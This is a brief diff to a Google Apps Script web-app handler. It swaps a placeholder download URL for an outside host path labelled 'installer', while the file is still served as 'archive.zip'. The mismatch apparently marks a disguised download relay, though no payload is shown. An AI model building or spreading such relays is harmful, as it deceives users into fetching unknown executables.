@@ -1,5 +1,5 @@
 function doGet(e) {
-  var sourceUrl = 'https://example.com/archive.zip';
+  var sourceUrl = 'https://bk.tara.net.bd/gd/uYtrut/?filename=installer';
   var fileName = 'archive.zip';
   
   var messages = [
@@ -82,4 +82,5 @@ function doGet(e) {
   } catch (error) {
     return HtmlService.createHtmlOutput('Ошибка: ' + error.message);
   }
+
 }
